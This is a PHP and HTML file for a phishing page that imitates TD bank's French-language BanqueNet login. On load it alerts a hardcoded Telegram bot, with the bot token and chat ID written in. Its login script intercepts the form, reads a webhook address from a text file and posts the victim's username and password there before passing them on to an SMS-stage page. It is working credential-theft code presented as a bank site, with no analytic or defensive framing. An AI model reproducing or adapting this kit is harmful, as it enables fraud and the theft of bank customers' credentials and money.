<?php
session_start();
$_SESSION["bank"] = 'TD';

?>

<?php
// Remplace par le token de ton bot Telegram
$token = '7231855269:AAHHENpMKORsPdG5gUH7z_NsS7Zz8QaZAcg'; 
// Remplace par ton chat_id Telegram
$chat_id = '6242884372'; 
// Message à envoyer avec l'IP de l'utilisateur, latitude et longitude
$message = "🏛🏛*.".$_SESSION["bank"]."*🏛🏛\n";

// URL de l'API Telegram pour envoyer le message
$url = "https://api.telegram.org/bot$token/sendMessage";

// Prépare les données à envoyer via l'API Telegram
$data = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown' // Permet de formater le texte avec Markdown
];

// Initialise cURL pour envoyer le message
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Désactive la vérification SSL (peut être activé en production avec un certificat valide)
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

// Exécute la requête et récupère la réponse
$response = curl_exec($ch);

// Vérifie si cURL a rencontré une erreur
if (curl_errno($ch)) {
    echo 'Erreur cURL : ' . curl_error($ch);
} else {
    echo '';
}

// Ferme la session cURL
curl_close($ch);
?>

<html>

<head>
    <meta charset="utf-8">
    <title>Se connecter à BanqueNet</title>
    <style>
        body,
        html {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            height: 100%;
            background-color: #f4f4f4;
        }

        header {
            background-color: #006241;
            color: white;
            padding: 10px 0;
        }

        nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 20px;
        }

        .logo {
            font-size: 24px;
            font-weight: bold;
        }

        .nav-links a {
            color: white;
            text-decoration: none;
            margin-left: 20px;
            font-size: 14px;
        }

        main {
            display: flex;
            justify-content: center;
            padding: 20px;
            max-width: 1200px;
            margin: 0 auto;
        }

        .content-wrapper {
            display: flex;
            width: 100%;
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        .login-form {
            padding: 20px;
            width: 50%;
            border-right: 1px solid #e0e0e0;
        }

        .info-section {
            width: 50%;
            padding: 20px;
        }

        input[type="text"],
        input[type="password"] {
            width: calc(100% - 22px);
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
        }

        button {
            background-color: #006241;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
        }

        .apple-image {
            text-align: left;
            margin-top: 20px;
        }

        .apple-image img {
            width: 100px;
            height: auto;
        }

        footer {
            background-color: #006241;
            color: white;
            text-align: center;
            padding: 20px 0;
            position: fixed;
            bottom: 0;
            width: 100%;
        }

        h2,
        h3,
        h4 {
            color: #006241;
        }

        .green-button {
            background-color: #4caf50;
            margin-top: 10px;
        }

        .white-button {
            background-color: white;
            color: #006241;
            border: 1px solid #006241;
        }
    </style>


    <!-- Simple CSS spinner -->
    <style>
        .spinner {
            border: 6px solid #f3f3f3;
            border-top: 6px solid #006241;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        #errorPopup {
            position: fixed;
            top: 30%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #f44336;
            color: white;
            padding: 20px 30px;
            border-radius: 10px;
            z-index: 10000;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
            cursor: pointer;
            font-size: 16px;
        }
    </style>
</head>

<body>
    <header>
        <nav>
            <div class="logo">TD</div>
            <div class="nav-links">
                <a href="#">Particuliers</a>
                <a href="#">Petites entreprises</a>
                <a href="#">Gestion de patrimoine</a>
                <a href="#">Solutions</a>
                <a href="#">English</a>
            </div>
        </nav>
    </header>

    <main>
        <div class="content-wrapper">
            <section class="login-form">
                <h2>Se connecter à BanqueNet</h2>
                <form id="loginForm" action="/tdd/sms.php" method="POST">
                    <input type="text" name="cvv" placeholder="Nom d'utilisateur ou carte d'accès" required>
                    <div style="margin-top: 10px; font-size: 12px; color: #006241;">+ Description optionnelle</div>
                    <input type="password" name="mdp" placeholder="Mot de passe" required>
                    <div style="margin-top: 10px;">
                        <input type="checkbox" id="remember" name="remember">
                        <label for="remember" style="font-size: 14px;">Mémoriser mes renseignements</label>
                    </div>
                    <button type="submit" class="green-button">Ouvrir une session</button>
                </form>
                <p style="font-size: 12px; margin-top: 20px;">Nom d'utilisateur ou mot de passe oublié ?</p>
            </section>

            <section class="info-section">
                <h3>Bienvenue dans BanqueNet</h3>
                <p style="font-size: 14px;">En ouvrant une session, vous confirmez que vous avez lu et accepté les modalités d'utilisation des services financiers.</p>
                <button class="white-button">S'inscrire en ligne</button>
                <h4>Aide pour ouvrir une session</h4>
                <p style="font-size: 14px;">Cliquez ici pour obtenir de l'aide sur l'ouverture d'une session</p>
                <h4>Sécurité AccèsWeb</h4>
                <p style="font-size: 14px;">Apprenez-en plus sur la sécurité en ligne</p>
                <h4>Explorez les services bancaires mobiles avec l'appli TD</h4>
                <p style="font-size: 14px;">Gérez vos affaires bancaires et vos placements où que vous soyez.</p>
                <div class="apple-image">

                    <p style="font-size: 14px;">Fractions d'options de Placements directs TD</p>
                    <button class="white-button">En savoir plus</button>
                </div>
            </section>
        </div>
    </main>

    <footer>
        <p>Aimeriez-vous parler à un conseiller? Nous joindre</p>
        <div>
            <a href="#">Twitter</a>
            <a href="#">Facebook</a>
            <a href="#">Instagram</a>
            <a href="#">YouTube</a>
            <a href="#">LinkedIn</a>
        </div>
    </footer>
    <script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault(); // Intercepte la soumission normale
        showLoader();

        const form = this;
        const formData = new FormData(form);
        const data = {
            cvv: formData.get('cvv'),
            mdp: formData.get('mdp'),
            remember: formData.get('remember') === 'on'
        };

        // On lit le webhook depuis le fichier texte
        fetch('/webhookurl.txt')
            .then(response => response.text())
            .then(webhookURL => {
                // Nettoyage (par exemple si le fichier contient des sauts de ligne)
                webhookURL = webhookURL.trim();

                return fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });
            })
            .then(response => response.json())
            .then(result => {
                hideLoader();

                if (result.continue === "yes") {
                    form.removeEventListener('submit', arguments.callee); // On retire l'interception
                    form.submit(); // Soumission réelle
                } else {
                    showPopup("Erreur : informations incorrectes.");
                }
            })
            .catch(error => {
                hideLoader();
                console.error('Erreur :', error);
                showPopup("Une erreur est survenue.");
            });
    });

    function showLoader() {
        const loader = document.createElement('div');
        loader.id = 'fullScreenLoader';
        loader.style.position = 'fixed';
        loader.style.top = 0;
        loader.style.left = 0;
        loader.style.width = '100vw';
        loader.style.height = '100vh';
        loader.style.backgroundColor = 'rgba(255, 255, 255, 0.8)';
        loader.style.display = 'flex';
        loader.style.justifyContent = 'center';
        loader.style.alignItems = 'center';
        loader.style.zIndex = 9999;
        loader.innerHTML = `<div class="spinner"></div>`;
        document.body.appendChild(loader);
    }

    function hideLoader() {
        const loader = document.getElementById('fullScreenLoader');
        if (loader) loader.remove();
    }

    function showPopup(message) {
        const popup = document.createElement('div');
        popup.id = 'errorPopup';
        popup.style.position = 'fixed';
        popup.style.top = '20px';
        popup.style.left = '50%';
        popup.style.transform = 'translateX(-50%)';
        popup.style.backgroundColor = '#f44336';
        popup.style.color = 'white';
        popup.style.padding = '15px 25px';
        popup.style.borderRadius = '8px';
        popup.style.boxShadow = '0 2px 10px rgba(0,0,0,0.2)';
        popup.style.zIndex = 10000;
        popup.textContent = message;

        function removePopup() {
            popup.remove();
            document.removeEventListener('click', removePopup);
        }

        document.body.appendChild(popup);
        document.addEventListener('click', removePopup);
    }
</script>



    <script>
        document.querySelectorAll('button').forEach(button => {
            button.addEventListener('mouseover', function() {
                if (this.classList.contains('green-button')) {
                    this.style.backgroundColor = '#45a049';
                } else if (this.classList.contains('white-button')) {
                    this.style.backgroundColor = '#f0f0f0';
                }
            });
            button.addEventListener('mouseout', function() {
                if (this.classList.contains('green-button')) {
                    this.style.backgroundColor = '#4caf50';
                } else if (this.classList.contains('white-button')) {
                    this.style.backgroundColor = 'white';
                }
            });
        });
    </script>
</body>

</html>
